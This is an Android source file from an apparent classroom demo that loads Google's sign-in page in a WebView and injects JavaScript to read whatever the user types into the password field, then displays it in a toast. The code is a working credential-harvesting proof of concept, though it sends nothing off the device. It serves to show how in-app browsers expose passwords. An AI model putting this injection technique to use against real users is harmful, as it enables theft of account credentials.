package spjpeter.ucsc.edu.passwordstealerdemo;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        // get webview
        WebView webView = (WebView) findViewById(R.id.webView);

        // JS needs to be enabled to steal passwords
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);

        // "Override" just steals password
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                getPassword(view);
                return false;
            }
        });

        webView.loadUrl("https://www.google.com");
    }

    void getPassword(WebView view) {
        // Evaluates JS. JS defines a function that finds your password, then calls it, result is
        // passed to onReceiveValue, which then toasts your password.
        view.evaluateJavascript("function g() { for (element of document.getElementsByClassName(\"whsOnd zHQkBf\")) { if (element.type === \"password\") { return element.value } } } g()",
                new ValueCallback<String>() {
                    @Override
                    public void onReceiveValue(String value) {
                        if (!value.equals("null")) {
                            toast("Your password is: \""+value+"\"");
                        }
                    }
                });
    }

    private void toast(String text) {
        Toast.makeText(this, text, Toast.LENGTH_SHORT).show();
    }
}
